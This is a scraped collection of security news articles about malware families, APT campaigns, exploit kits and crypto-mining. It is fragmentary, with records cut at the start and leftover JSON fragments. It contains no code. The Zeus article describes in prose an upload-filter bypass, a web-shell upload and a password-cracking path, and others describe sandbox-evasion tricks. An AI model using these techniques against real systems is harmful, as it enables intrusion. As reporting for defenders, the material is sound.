The threat actor is tracked as LuckyMouse, Emissary Panda, APT27 and Threat Group 3390. The group has been active since at least 2010, targeting hundreds of organizations around the world, including U.S. defense contractors, financial services firms, a European drone maker, and the U.S.-based subsidiary of a French energy management company. Researchers at Kaspersky Lab recently identified a new attack carried out by this actor. The security firm spotted the campaign in March 2018, but believes it was launched in the fall of 2017. The attack targeted a national data center in an unnamed country in Central Asia. Researchers say the goal is likely to inject malicious JavaScript code into the government websites connected to the data center in order to conduct watering hole attacks. When accessed, the compromised government websites served either the Browser Exploitation Framework (BeEF), a penetration testing suite that focuses on the web browser, or the ScanBox reconnaissance framework. Kaspersky has not been able to determine how the national data center was breached, but believes the hackers may have used watering hole attacks aimed at the organization’s employees or through weaponized Office documents – the threat group has been spotted using CVE-2017-11882. The attack involved a piece of malware tracked by Kaspersky as HyperBro, a RAT that has been used by several Chinese-speaking threat actors. The samples analyzed by Kaspersky had timestamps ranging from December 2017 to January 2018, with evidence found by experts suggesting that the malware had made its way to the data center sometime in mid-November 2017. The main command and control (C&C) server used in this campaign is hosted on an IP address associated with a Ukrainian ISP. Specifically, the IP belongs to a MikroTik router running a firmware version released in March 2016. “A national data center is a valuable source of data that can also be abused to compromise official websites,” Kaspersky researchers said in a blog post. “Another interesting point is the Mikrotik router, which we believe was hacked specifically for the campaign. The reasons for this are not very clear: typically, Chinese-speaking actors don’t bother disguising their campaigns. Maybe these are the first steps in a new stealthier approach.” " }

The existence of Trojan-SMS.AndroidOS.Svpeng.a was first brought to light in July 2013 when Kaspersky Lab published a report on its Russian language blog.  At the time, the malware was designed to abuse the SMS services offered by certain Russian banks in order to steal money from accounts.  In November 2013, Kaspersky reported that the authors of the mobile malware had added new phishing capabilities to the threat, and at the beginning of 2014, they had even included ransomware functionality. In a blog post published on Wednesday, the security company warned that since the beginning of June, a new version of the Trojan had been used to infect devices in the United States. While the main version of Svpeng continues to target Russian users, 91% of the infections attributed to the new variant appear to be located in the US, with some infections also being detected in countries including the UK, Switzerland, Germany, India and Russia, Kaspersky said. When executed, the malicious mobile application, which works just like a typical piece of ransomware, appears to be scanning the device. After a while, the smartphone is locked and its owner is informed that “prohibited content” has been found, and that $200 must be paid via MoneyPak vouchers to have the device unlocked.  “When it comes to ransomware Trojans, the new modification of Svpeng stands out for its wholly new implementation of standard features – it completely blocks the mobile device, even making it impossible to invoke the menu to switch off or reload the device,” Kaspersky Lab Expert Roman Unuchek explained in a blog post.  “The victim can turn off the device by pressing the on/off button for a few seconds, but the Trojan immediately starts working as soon as the device is switched on again,” Unuchek added. The malware also checks to see if mobile applications from Bank of America, Chase, Regions, Citibank, Wells Fargo, American Express, BB&T, or TD Bank are installed on infected devices. Kaspersky’s experts believe the attackers are most likely collecting statistics regarding the use of these apps. Another noteworthy aspect about this new Svpeng variant is that it contains a Cryptor class reference. For the time being, the feature is not enabled, but this indicates that the cybercriminals might be planning on using the malware to encrypt files stored on infected devices and hold them for ransom. According to Kaspersky, this type of functionality has been seen in Trojan-Ransom.AndroidOS.Pletor.a, also known as Simplocker, which is believed to be the first file-encrypting ransomware targeting Android phones.  The encryptor Trojan appears to be fairly successful, as by June 5 Kaspersky had already detected more than 2,000 infections across 13 countries.

Also known as Sirefef, ZeroAccess was disrupted by authorities in December 2013. Traditionally, it has been used to perpetrate click fraud. At one point during 2012, it was linked to a campaign that at one point was estimated to be making as much as $100,000 per day. Between March 21, 2014, and July 2, 2014, the SecureWorks Counter Threat Unit (CTU) observed the botnet reactivate. On Jan. 15 of this year, the botnet once again began distributing click fraud templates to compromised systems. \"The threat actors behind ZeroAccess have not attempted to expand the botnet with new compromises following the December 2013 disruption,\" according to a blog post by CTU. \"Instead, the botnet is composed of residual hosts from past compromises, so it is much smaller than it has been in the past. ZeroAccess is segmented into two distinct botnets that operate over different UDP ports: UDP 16464/16471 — used by compromised Windows systems running on a 32-bit architecture (and) UDP 16465/16470 — used by compromised Windows systems running on a 64-bit architecture.\" \"Compromised systems act as nodes in the P2P network, and they periodically receive new templates that include URLs for attacker-controlled template servers,\" the researchers noted. \"After the systems visit these URLs, the malware begins a cascade of redirects that eventually lead to a Traffic Direction System (TDS) that sends the bot to its final destination.\" According to SecureWorks, researchers have spotted 55,208 unique IP addresses participating in the botnet between January 17 and January 25, 2015. During this period, the peer-to-peer network had 38,094 hosts in the 16464/16471 (32-bit) segment and 17,114 hosts in the 16465/16470 (64-bit) segment participating. \"Although the threat actors behind ZeroAccess have not made any measurable attempts to augment the botnet in more than a year, it remains substantial in size,\" according to the researchers. \"Its resiliency is a testament to the tenacity of its operators and highlights the danger of malware using P2P networks. ZeroAccess does not pose the same threat as other botnets used to perpetrate banking fraud, steal login credentials and valuable data, or hold victims’ files for ransom. However, it does cause untold fraud losses for advertisers and consumes considerable resources for organizations with compromised hosts.\" " }

Discovered in March this year, Proton was designed to execute any bash command under root, monitor keystrokes, upload/download files to/from the victim’s machine, grab screenshots or webcam captures, get updates, and also send notifications to the attacker. It can also help the attacker connect via SSH/VNC to the target machine. In May, the malware’s operators managed to compromise a download mirror of the popular video converting tool HandBrake and configured it to distribute the RAT via a trojanized version of the legitimate app. Now, the attackers were able to hack Eltima, the makers of the Elmedia Player software, and replaced the legitimate application binaries available for download with trojanized iterations. Thus, Eltima ended up distributing the OSX/Proton malware via their official website. The attack was observed on Thursday, October 19, and Eltima was able to clean the infected application binaries within hours after being informed on the incident, ESET says. All users who downloaded the Elmedia Player software recently should check their systems for possible compromise. For that, they should verify for the presence of the following files or directories: /tmp/Updater.app/, /Library/LaunchAgents/com. Eltima.UpdaterAgent.plist, /Library/.rand/, and /Library/.rand/updateragent.app/. “If any of them exists, it means the trojanized Elmedia Player application was executed and that OSX/Proton is most likely running,” ESET notes. Apparently only the application version downloaded through the company’s website was compromised, while the version distributed through the built-in automatic update mechanism was supposedly unaffected. Once installed on a compromised machine, the malware can steal operating system details, browser information from Chrome, Safari, Opera, and Firefox (including history, cookies, bookmarks, and login data), cryptocurrency wallets (Electrum, Bitcoin Core, and Armory), SSH private data, macOS keychain data, Tunnelblick VPN configuration, GnuPG data, 1Password data, and a list of all installed applications. Proton’s operators aren’t the only cybercriminals out there attempting to infect users via supply chain attacks. Last year, Mac Bittorrent client Transmission was hacked twice to spread the OSX/KeRanger ransomware and OSX/Keydnap password stealer, respectively. Another incident of global impact was the compromise of the updater process of tax accounting software MEDoc to distribute the NotPetya wiper. Spreading fast to organizations worldwide, the attack resulted in millions of dollars in losses, as some organizations were unable to recover data following the incident. " }

The malware, dubbed by researchers “KONNI,” has evaded detection likely due to the fact that it has only been used in highly targeted attacks. The malware has evolved over the years, with recent versions capable of stealing data and executing arbitrary code on infected systems. Talos is aware of several campaigns using this piece of malware over the past years. The first, likely launched in September 2014, involved an SRC file acting as a dropper for two other files: a picture that served as a decoy and the KONNI executable. In this attack, the KONNI malware was designed to be executed only once and steal information from the infected device, including keystrokes, clipboard content, and data associated with the Chrome, Firefox and Opera web browsers. The second campaign, observed last year, also involved an SRC file, but this time it dropped two office documents. These documents, one written in English and one in Russian, referenced the tension between North Korea and the U.S., and they were titled “N. Korean hydrogen bomb can wipe out Manhattan: propaganda outlet.” The 2016 attacks leveraged malware that had a different architecture, and introduced new features that also allowed attackers to upload and download files, and execute arbitrary commands. While analyzing this campaign, researchers found evidence suggesting that an operation also took place in 2015. Experts have already spotted two KONNI campaigns this year. One of the decoy documents was titled “Pyongyang e-mail lists - April 2017” and it contained the email addresses and phone numbers of individuals working at organizations such as the United Nations, UNICEF and embassies linked to North Korea. Another decoy document, titled “Inter Agency List and Phonebook - April 2017” contained names and contact information for members of agencies, embassies and other public organizations connected to North Korea. Researchers said it’s unclear if these are legitimate files that have been stolen by the cyberspies or if the attackers created the documents themselves. Compared to previous versions, the latest malware samples are also capable of collecting system information and capturing screenshots. The threat actor has also created 64-bit versions of the malware. The fact that 3 of the 4 campaigns analyzed by Cisco were aimed at organizations linked to North Korea has led researchers to believe that the threat group behind KONNI has a real interest in this country. The latest attack started a few days ago and it’s still active. " }

The existence of the threat, dubbed “OceanLotus,” was brought to light in May 2015 by Qihoo 360. The Chinese security firm reported at the time that the Trojan had been used since April 2012 by an advanced persistent threat (APT) actor that targeted government organizations, research institutes, maritime agencies, and companies specializing in various activities, such as sea construction and shipping. The attackers have been distributing the threat via spear phishing and watering hole attacks. Qihoo 360 researchers said they had spotted four different versions of the OceanLotus Trojan, including one designed to target OS X systems, on more than 100 systems across China. AlienVault has observed two samples of OceanLotus for OS X, one of which could be an early version because it’s less developed. The more recent variant had a zero detection rate on VirusTotal at the time of AlienVault’s analysis on February 8, and it’s currently detected as a version of OceanLotus by only two antiviruses, despite the fact that the sample was first uploaded to the malware scanning service nearly five months ago. The OS X version of OceanLotus is packaged as an application bundle disguised as an Adobe Flash Player update. The malware’s loader, designed to decode and execute the main component, is a Mach-O file that can run on both i386 and x86_64 architectures. The threat’s developers have used XOR encryption, a technique known as indirection, and an anti-debugging feature to ensure that their creation is more difficult to detect and analyze. The use of commands and API calls specific to OS X suggests that the authors are familiar with the Apple operating system and they designed this version of OceanLotus specifically for it. Once it infects a system, the Trojan sets up a Launch Agent for persistence and attempts to contact its command and control (C&C) servers. After establishing an active connection to the server, OceanLotus collects basic information from the infected machine, including device name, username, a unique ID, and determines if the victim has root privileges. The malware is capable of performing several tasks, including opening application bundles, returning information about a file or path, getting a list of recently opened documents, obtaining information on active windows, capturing screenshots, downloading files from a URL, executing files, killing a process, and deleting files. “The OS X version of OceanLotus is clearly a mature piece of malware that is written specifically for OS X. The use of OS X specific commands and APIs is evidence that the authors are intimately familiar with the operating system and have spent quite a bit of time customizing it for the OS X environment,” AlienVault’s Eddie Lee explained in a blog post. “Similar to other advanced malware, the use of obfuscation and indirection within the binary are an indication that the authors want to protect their work, make it difficult for others to reverse engineer, and reduce detection rates.” Mac OS X infections are on the rise, according to recent reports, and security firms have identified several sophisticated pieces of malware designed to target such systems, including the threats known as WireLurker and XcodeGhost.

Dubbed PyRoMineIoT, the malware is similar to the PyRoMine crypto-currency miner that was detailed in late April. Both mine for Monero, both are Python-based, and both use the EternalRomance exploit for propagation purposes (the vulnerability was patched in April last year). The older threat, Fortinet’s Jasper Manuel reveals, has received an update to add some obfuscation, likely in an attempt to evade detection from anti-virus programs. The latest PyRoMine variant is hosted on the same IP address 212[.]83.190[.]122, was compiled with PyInstaller into a stand-alone executable, and continues to use the EternalRomance implementation found on the Exploit Database website, the same as the initially analyzed variant. After a successful exploitation, an obfuscated VBScript is downloaded. The VBScript has the same functionality as the previously used one, but features more organized code and also adds a version number. The same as before, it sets up a Default account with the password [email protected] and adds the account to the local groups “Administrators,” “Remote Desktop Users,” and “Users,” after which it enables RDP and adds a firewall rule to allow traffic on port 3389. The VBScript also downloads other components, including a Monero miner (XMRig), but now uses randomly generated names for these files. The malware attempts to remove older versions of PyRoMine from the system. One of the pool addresses used by the malware suggests the actors made around 5 Monero (about $850) from their nefarious activities. The malware has infected a large number of systems since April, with the top 5 affected countries being Singapore, India, Taiwan, Côte d’Ivoire, and Australia. The newly discovered PyRoMineIoT, Manuel says, is similar to PyRoMine, hence the similar naming. The threat is served from “an obviously malicious looking website,” disguised as security updates for web browsers. The fake updates are downloaded as .zip archives that contain a downloader agent written in C#. This agent fetches the miner file and other malicious components, including a Python-based malware that leverages EternalRomance to spread the downloader to vulnerable machines in the network. The agent also fetches a component to steal user credentials from Chrome, and another to scan for IoT devices in Iran and Saudi Arabia that use the admin: admin username and password pair. The EternalRomance implementation uses the same code base as PyRoMine and works in a similar manner, collecting the IPs of local subnets and iterating through them to execute the payload. It uses the username ‘aa’ with an empty password. The second component is part of the legitimate ChromePass tool that allows users to recover passwords from the Chrome browser. As part of these attacks, it is abused to steal credentials from unsuspecting users: the tool saves the recovered credentials in XML format and uploads the file to an account on DriveHQ’s cloud storage service (the account has been already disabled). The most interesting aspect of this malware, however, is its ability to search for vulnerable IoT devices, but it only targets those in Iran and Saudi Arabia for that. The threat sends the IP information of discovered devices to the attacker’s server, supposedly in preparation for further attacks. The same as PyRoMine, the malware downloads the XMRig miner on the compromised system. After checking one of the pool addresses used by the threat, however, the researcher discovered that it hasn’t generated revenue yet. This, however, isn’t surprising, considering that the malware only started being distributed on June 6, 2018, and is an unfinished project. “This development confirms yet again that malware authors are very interested in cryptocurrency mining, as well as in capturing a chunk of the IoT threat ecosystem. We predict that this trend will not fade away soon, but will continue as long as there are opportunities for the bad guys to easily earn money by targeting vulnerable machines and devices,” Fortinet concludes.

According to Kaspersky Lab researchers Costin Raiu and Igor Soumenkov, a copy of the malicious files published by Der Spiegel immediately reminded them of Regin. After examining the code closely, they concluded that the Qwerty keylogger described in the document is identical in functionality to the Regin 50251 plugin. \"The Qwerty module pack consists of three binaries and accompanying configuration files,\" the researchers blogged. \"One file from the package– 20123.sys – is particularly interesting. The \"20123.sys\" is a kernel mode part of the keylogger. As it turns out, it was built from source code that can also be found one Regin module, the \"50251\" plugin.\" Publicly identified separately in November by security researchers at Kaspersky Lab and Symantec, Regin has been linked to cyber-espionage campaigns going back to at least 2008. The document published by Der Spiegel calls Qwerty a plugin for a platform codenamed \"WARRIORPRIDE\" and is designed to \"intercept all keyboard keys pressed by the victim and record them for later inspection.\" \"WARRIORPRIDE, as all the malware programs we discovered in Five Eyes' arsenal, is very flexible and versatile,\" according to a document leaked by Der Spiegel. \"Among the many interception modules WARRIORPRIDE is provided with, the technical research team has obtained a copy of QWERTY - WARRIORPRIDE's component designed to invisibly record all key strokes from an infected Windows computer - from the Snowden Archive.\" Five Eyes is the name given to the intelligence alliance comprised of the United States, Australia, Canada, New Zealand and the United Kingdom. The Kaspersky Lab researchers noted that most of the Qwerty components call plugins from the same pack (with plugin numbers 20121 – 20123), but there is also one piece code that references plugins from the Regin platform. One particular part of code, they state, is used in both the Qwerty 20123 module and Regin's 50251 plugin, and it addresses the plugin 50225 that can be found in the virtual file systems of Regin. The 50225 plugin is responsible for kernel-mode hooking. \"This is a solid proof that the Qwerty plugin can only operate as part of the Regin platform, leveraging the kernel hooking functions from plugin 50225,\" the researchers noted. \"As an additional proof that both modules use the same software platform, we can take a look at functions exported by ordinal 1 of both modules. They contain the startup code that can be found in any other plugin of Regin, and include the actual plugin number that is registered within the platform to allow further addressing of the module. This only makes sense if the modules are used with the Regin platform orchestrator.\" Last year, Britain's GCHQ (Government Communications Headquarters) spy agency was linked by Snowden to a 2013 cyber-attack on Belgacom, the largest telecommunications provider in Belgium. The Regin malware platform is believed to have been used in the attack.  \"Our analysis of the QWERTY malware published by Der Spiegel indicates it is a plugin designed to work part of the Regin platform,\" blogged Raiu and Soumenkov. \"The QWERTY keylogger doesn't function as a stand-alone module, it relies on kernel hooking functions which are provided by the Regin module 50225. Considering the extreme complexity of the Regin platform and little chance that it can be duplicated by somebody without having access to its sourcecodes, we conclude the QWERTY malware developers and the Regin developers are the same or working together.\" " }

Malicious macros have been used for over a decade for malware distribution, and have become highly popular among cybercriminals over the past several years, despite Microsoft’s efforts to block them. They are used to drop all types of malware, including banking malware, ransomware, spyware, and backdoors. The normal infection chain when malicious macros are used involves tricking the victim into enabling the macro in the document received via spam email. Next, malicious code (usually PowerShell) is executed to download and run the final payload. The effectiveness of macros as a delivery method inspires miscreants to continue to use the technique and improve it, in an attempt to evade detection and hinder analysis. Ursnif’s operators have already shown a focus on evading sandbox detection, and recently adopted checks that allow them to do so. One employed tactic is the use of AutoClose, which can run the PowerShell script after the document was closed, thus preventing detection that focuses on analyzing the macro itself. The method is easy to implement and Trend Micro says it is becoming a common feature in many malicious macros. “After coercing the victim to enable macros, the macro waits for the would-be victim to close the document and only then will PowerShell execute. Sandbox detections might miss the malicious behavior since the malicious routines will only run after the document is closed,” the researchers say. Another detection evasion technique involves enumeration variables, which allow attackers to check the Office version by comparing them to certain values, given that some of these variables are only present in later versions of Microsoft Office. One specific enumeration variable allows attackers to detect Office 2007, which is commonly used in sandboxes for automated analysis. Thus, if Office 2007 is detected, the macro won’t deploy. Another sandbox evasion tactic involves the use of a filename check in the macro. This method is meant to counter sandboxes where the file is renamed to its MD5, SHA-1, or SHA-256 equivalent. Thus, if the script detects a long filename, the macro won’t execute the malicious routines. The one thing that these samples had in common was the use of PowerShell scripts to download and execute the final payload. In all cases, that was a variant of the Ursnif Trojan, but other malware could also use them, the researchers admit. “However, these are not unique to one malware; it is possible that others may be downloaded. As malware and their delivery methods continue to evolve, security must be updated as well. Users need to be protected with the latest solutions that can combat new and evolving threats,” Trend Micro concludes. " }
{ "_id" : { "$oid" : "5b27c3ae6cefc41c844ab1da" }, "Category" : "Malware", "Title" : "New Anti-Analysis Feature Added to Neutrino EK", "Address" : "https://www.securityweek.com/new-anti-analysis-feature-added-neutrino-ek", "Date" : "February 05, 2016", "Article" : "The developers of the Neutrino exploit kit have added a new feature designed to reduce exposure to automated scans and security researchers’ analysis attempts. Researchers at Trustwave discovered the new feature after observing a drop in Neutrino exploit kit instances in their lab environment. A closer analysis revealed that the EK instances they had been monitoring served malware as expected when accessed from a vulnerable Windows machine, but the Neutrino server was not responding to requests from the lab environment. “The problem was that every other website (and even exploit kit) was working as intended, the environment seemed completely fine except for when accessing Neutrino,” Trustwave’s Daniel Chechik explained in a blog post. “We tried the obvious solutions of trying to change IP addresses, browsers, pretty much anything we know that exploit kits commonly use to evade security researchers, but to no avail.” After making some modifications to the maximum transmission unit (MTU) of the TCP packets they were sending, Trustwave researchers finally got a response from the Neutrino server. While at first this appeared to be a bug in Neutrino, it turned out to be the result of a new feature added by the exploit kit’s developers. A newly added iptables module, named OSF, provides passive operating system fingerprinting and allows the attackers to prevent certain types of machines from accessing their server. The Neutrino servers could not be accessed from Trustwave’s lab environment because the test machine had been detected as running Linux, which is not allowed because the operating system is often used for security products, servers and other types of devices that can’t be infected by the malware delivered by the exploit kit. By filtering out Linux machines, the cybercriminals increase chances of preventing automated scanning tools and researchers from accessing their servers. When Trustwave experts changed the MTU, the Neutrino server started detecting the test machine as “unknown OS,” allowing it to connect. “Exploit kits often employ measures to keep security researchers and other unwanted visitors away from their servers, but most of the time these measures are handled on the HTTP level- with web servers redirecting you away or returning fake error codes; implementing this logic on a TCP level as Neutrino did is a fairly smart move on their part: generally speaking when a server doesn't respond to you at all you tend to assume that it's down,” Chechik said. “With exploit kits changing their location as rapidly as they sometimes do, it is very likely that this behavior would simply be written off as a dead server and Neutrino would achieve its goal of being left alone by anyone who isn't a potential victim,” he added. The malicious actors behind Neutrino have been working on improving their creation over the past period. Heimdal Security reported in early January that a new Neutrino campaign had been using blackhat SEO poisoning tricks in an effort to deliver ransomware and other types of malware. " }

The threat actor, tracked by the security firm as TA459, has been active since at least 2013 and it’s believed to be operating out of China. The cyberspies have been known for using malware such as NetTraveler (aka TravNet), PlugX, Saker, Netbot, DarkStRat, and ZeroT in attacks aimed at organizations in Russia and neighboring countries. Proofpoint recently detailed a series of attacks launched by the group against military and aerospace organizations in Russia and Belarus. On April 20, researchers spotted a campaign aimed at global financial firms operating in Russia and neighboring countries. Given that the attacks were apparently aimed at analysts covering the telecommunications industry, experts believe this latest operation is likely a continuation of a similar campaign first analyzed in the summer of 2015. In the recent attacks, TA459 sent out spear-phishing emails containing a Word document set up to exploit a recently patched remote code execution vulnerability tracked as CVE-2017-0199. The attackers started leveraging this flaw just days after Microsoft released a fix. When the malicious document is opened, an HTML application (HTA) file disguised as an RTF document is downloaded. PowerShell is then used to download and execute a script that fetches and runs the ZeroT downloader. ZeroT was analyzed by Proofpoint when it investigated the recent attacks aimed at military and aerospace organizations, but some changes and improvements have been made in the latest version. One of the changes is the use of a legitimate McAfee utility for sideloading instead of a Norman Safeground utility. While ZeroT is the threat actor’s most common first stage payload, the second payload includes various pieces of malware. In recent attacks, Proofpoint noticed both PlugX and a Trojan tracked as PCrat/Gh0st, which is used less often by the group. “Multinational organizations like the financial services firms targeted here must be acutely aware of the threats from state-sponsored actors working with sophisticated malware to compromise users and networks,” Proofpoint researchers explained. “Ongoing activity from attack groups like TA459 who consistently target individuals specializing in particular areas of research and expertise further complicate an already difficult security situation for organizations dealing with more traditional malware threats, phishing campaigns, and socially engineered threats every day.” The fact that the threat actor has used CVE-2017-0199 in its operation is not surprising. The flaw had been exploited by several groups before Microsoft released a patch for it, and others, including Iranian hackers, started using it shortly after its existence came to light. " }

As part of their proof-of-concept, Websense set up a command and control server in an internal research network that replicated deployments used by cybercriminals in the wild. According to Websense, Zeus 2.0.8.9 was used in the experiment, but researchers believe the same issue is present in other versions as well.  Zeus bots, explained Websense researcher Abel Toro, operate in the following way: first, they infect a system; second, they gather credential and personally-identifiable information; and thirdly, they upload the stolen data to the command and control server in the form of reports.  \"The crucial point here is that the bot uploads some file to the remote server,\" he blogged. \"What if we could leverage this mechanism to impersonate a bot and upload our own file to the server? Let’s say an executable, with which we could execute commands on the server.\" \"Unfortunately,\" he continued, \"we can’t just simply upload a file. Zeus uses an RC4 algorithm to encrypt all communications between the bot and the server, so it will only accept files if they are encrypted with the same key that the server uses. Luckily for us, RC4 is a symmetric cipher, which means that both parties (in this case the bot and the C&C) use the same pre-shared key. This further implies that the key is embedded somewhere in the bot. So we need to capture a Zeus binary and find the keys in order to be able to communicate with the C&C. We can achieve this by using the Volatility memory analysis tool to dump the RC4 keystream from an infected machine’s memory.\" After obtaining the key, the researchers turned their focus to using it for encrypting the file they wanted to upload in order to impersonate a bot trying to upload a report. However, the command and control server would want to make sure only valid reports are uploaded. \"We know that the C&C is using .php files, therefore, we will try to upload a php file too, which will be executed on the server side by the PHP interpreter,\" he blogged. \"But, the server won't let us upload .php files. However, there is a vulnerability in the C&C’s code and a well-known technique to bypass the checks they are performing on uploaded files. One of the most widely used bypass methods, he noted, is to add a period after filename.php (filename.php.). \"The PHP interpreter is quite liberal, and it will interpret it as a valid php file,\" he blogged. \"With PHP we could execute a number of commands on the server, but in our case, we would like to get access to the control panel, so we will use a PHP web-shell, which will allow us to browse the filesystem, interact with the backend database, and (possibly, depending on the server configuration) execute system commands.\" \"Now, we have everything we need to compromise the C&C server: the RC4 key, the file we want to upload (web-shell), and a way to bypass the checks,\" he added. \"By default, Zeus C&C’s use gate.php to receive the reports, and they will store these reports in C&C’s IP/_reports/files/BOTNET_ID/BOTID/ directory. Since we are impersonating a bot, we control both the BOTNET_ID and BOTID values, so we can predict where our uploaded file will end up. All we have to do after uploading our file is to browse to this location and our code will be executed.\" The shell enabled the researchers to browser files with important information about the particular Zeus command and control server and to interact with the backend database, Toro blogged. In order to gain access to the control panel, the password for it had to be stolen from the database, which in Websense's test was password-protected as well. Because the bot needs to interact with the database however, the credentials are stored in one of the configuration files of the bot (config.php under /system/directory). Once inside the database, the researchers accessed a table used for storing information about the control panel user, such as their username and hashed password. \"Zeus stores these passwords using a simple MD5 hash without any salting, thus they are relatively easy to crack,\" Toro blogged. \"Another option would be – since we have full read/write access to the database – to create our own password, hash it with MD5, and insert that into the database instead of the current password. Now, we will try to crack the password, hoping that it is not a very strong one.\" Once the password was cracked, the researchers had full access to the control panel. The experiment shows that while Zeus may be regarded as an advanced banking Trojan by some, it is far perfect, Toro added. " }

With the number of malware samples ultimately delivering crypto-miners well over the half a million mark, it’s no wonder that miscreants are able to profit from this type of nefarious activity. To these, one can add the JavaScript, or web-based, malicious mining operations, which are highly lucrative as well. Looking into the proliferation of crypto-mining malware, Palo Alto’s Josh Grunzweig discovered information on around 630,000 malicious samples, 3,773 emails used to connect with mining pools, and 2,995 mining pool URLs. Over 530,000 malware samples target Monero, roughly 53,000 target Bitcoin, and 16,000 target Cryptonite (XCN), with the rest spread across the remaining currencies. The researcher also identified 2,341 Monero (XMR) wallets, 981 Bitcoin (BTC) wallets, 131 Electroneum (ETN) wallets, 44 Ethereum (ETH) wallets, and 28 Litecoin (LTC) wallets. Given the clear interest cybercriminals have in Monero, the researcher focused on this virtual coin as well. In addition to the 2,341 Monero wallets extracted from the analyzed sample set, he also managed to determine the mining pools used, and discovered that, of the top ten mining pools used by this malware, all but one allows for anonymous viewing of statistics based off of the wallet as an identifier. “By querying the top eight mining pools for all 2,341 Monero addresses, I was able to determine exactly how much Monero has been mined historically with a high degree of accuracy. By querying the mining pools themselves, instead of the blockchain, we’re able to say exactly how much has been mined without the fear of the data being polluted by payments to those wallets via other sources,” he notes. Thus, Grunzweig determined that a total of 798613.33 XMR has been mined to date, representing around 5% of all Monero in circulation. Web-based Monero miners and miners the researcher doesn’t have visibility into aren’t included here. While half of the 2,341 wallets identified have been unable to generate a meaningful amount of Monero, the remaining batch obtained over $140 million, the researcher estimates. According to Grunzweig, “a total of $175m has been found to be mined historically via the Monero currency.” 1,278 (55%) of the identified wallets earned 0.01 XMR (~$2.20) or more and only a small subset earned a significant (100 XMR or greater) amount of coins. Only 99 wallets (less than 2% of all wallets identified) have received over 1,000 XMR, and 16 wallets (0.68% of all wallets) have obtained over 10,000 XMR. Looking at the total hashing power, the research revealed the attackers only used 2% of the global hashing power mining the Monero network. At around 19MH/s, the hashrate would result in approximately $30,443 per day being mined. “To date, the popularity of malicious cryptocurrency mining activity continues to skyrocket. The large growth of malware mining cryptocurrencies is a direct result of a previous spike in value, which has since corrected to a value that is more in line with expectations. As this correction has taken place, only time will tell if cryptocurrency miners will continue in popularity. It is clear that such activities have been incredibly profitable for individuals or groups who have mined cryptocurrency using malicious techniques for a long period of time,” Palo Alto concludes.

Detected by Dr. Web products as Linux.Ekoms.1, the malware takes screenshots every 30 seconds and saves them to a temporary folder in the JPEG format using the extension .sst. If the screenshot cannot be saved as a JPEG, Ekoms attempts to save it in the BMP image format. An analysis of the Trojan revealed that its developers are also working on a feature designed to record audio and save the recording in WAV format in a file with the .aat extension in the same temporary folder. While the sound recording feature exists, it’s not active in the Ekoms variant analyzed by Dr. Web. The malware is designed to periodically search its temporary folder for files with certain names and extensions. It looks for .aat and .sst files, which are supposed to store screenshots and audio recordings, and also for .ddt and .kkt files, which suggests the malware authors might be targeting other type of content as well. The files that match the search criteria are uploaded to a remote server whose address is hardcoded in the malware. All data sent by Linux.Ekoms.1 to the server is encrypted. Attackers can use the command and control (C&C) server to send various commands to the threat, including to download other files, and enable or disable specified services. There are some instructions that have not been implemented, which also suggests the Trojan is still under development. Linux systems are increasingly targeted by various types of malware, and many of the threats are designed to help malicious actors launch distributed denial-of-service (DDoS) attacks. Linux ransomware has also started making rounds over the past period. The file-encrypting ransomware Linux.Encoder targets web servers, websites, backups and source code stored on infected machines. Linux.Encoder infected thousands of devices, but researchers found a flaw that can be leveraged to recover encrypted files without paying the ransom. Linux.Encoder is reportedly based on Hidden Tear, an open source ransomware whose author intentionally weakened encryption to prevent abuse. " }

Dubbed Magniber, the threat checks the language of the compromised systems and only fully executes on machines featuring the locale identifier string 0x0412, which is the identifier for Korean, Trend Micro reports. The new malware family was first observed this week, when Magnitude returned to activity after nearly a month of silence. The EK was usually distributing the Cerber ransomware, but it appears that its operators have moved to other payloads. While most of the Magnitude attacks over the past two months and a half focused on Taiwan (81%), the security researchers noticed a shift toward South Korea on October 15. Magnitude campaigns use malvertising to infect users and deliver malicious payloads by exploiting the Internet Explorer vulnerability CVE-2016-0189, which Microsoft patched in May 2016. Magnitude was the last exploit kit to have delivered Cerber, which appears to have disappeared from the threat landscape last month. Now, the toolkit is pushing a ransomware family that apparently uses the same payment system as Cerber. This is why the security researchers who discovered the threat called it Magniber (Magnitude+Cerber), although there doesn’t seem to be code base resemblance between the two, Bleeping Computer’s Lawrence Abrams notes. Specific to the new malware is the fact that it uses the victim’s unique ID as a subdomain to the payment portal on Tor. This subdomain is then displayed in the ransom note deployed on the infected system. Once on the infected system, the malware starts searching for files to encrypt. At the moment, it is targeting over 700 file types, Malwarebytes says. The ransomware avoids encrypting files located in folders such as Windows, Program Files, Boot, Recycle Bin, Local Settings, and several Documents and Settings subfolders, among others.  According to Trend Micro, Magniber’s code shows that the ransomware might still be under development. According to them, the threat could be still in experimental stages, supposedly built by Magnitude’s developers. “Indeed, we’re bound to see more developments in both Magnitude and Magniber as their capabilities and tactics are fine-tuned. While Magnitude’s distribution of Magniber is still relatively muted, their ability to exploit security gaps in the system and encrypt its files makes their combination a credible threat,” the security researchers note. According to Abrams, files encrypted by Magniber can be decrypted for free, so victims should refrain from paying the ransom. All users, however, are advised to keep their applications and operating systems updated at all times, and to install and maintain an anti-virus solution to avoid being infected in the first place. Users should also back up their data at all times, for easy recovery in the event of an infection. " }

The report, entitled 'Defensive Best Practices for Destructive Malware', seems in part aimed at dealing with the type of data-wiping malware at the center of the recent attack on Sony Pictures Entertainment. Much of the advice, the document notes, is also contained in the guidance in the previously published 'Information Assurance Mitigation Strategies'. Among the key pieces of advice: segregate network systems, limit workstation-to-workstation communication and protect and restrict administrative privileges for high-level administrator accounts. Organizations are also advised to deploy, configure and monitor application whitelisting to prevent unauthorized or malicious software from executing. \"The earlier that network defenders can detect and contain an intrusion, the less damage the intruder can possibly cause,\" according to the report. \"In addition to trying to contain an intrusion as early as possible, planning for the possibility of a significant intrusion and potential wide scale destruction of data and systems will be well worth the effort in the event that they are needed. Preparing through offline backups and exercised incident response and recovery plans can make the organization more resilient, enabling quick reconstitution and the resumption of normal business functions as soon as possible.\" Other advice includes:                                        \"Once a malicious actor achieves privileged control of an organization's network, the actor has the ability to steal or destroy all the data that is on the network,\" report continues. \"While there may be some tools that can, in limited circumstances, prevent the wholesale destruction of data at that point, the better defense for both industry and government networks is to proactively prevent from gaining that much control over the organization's network.\" " }

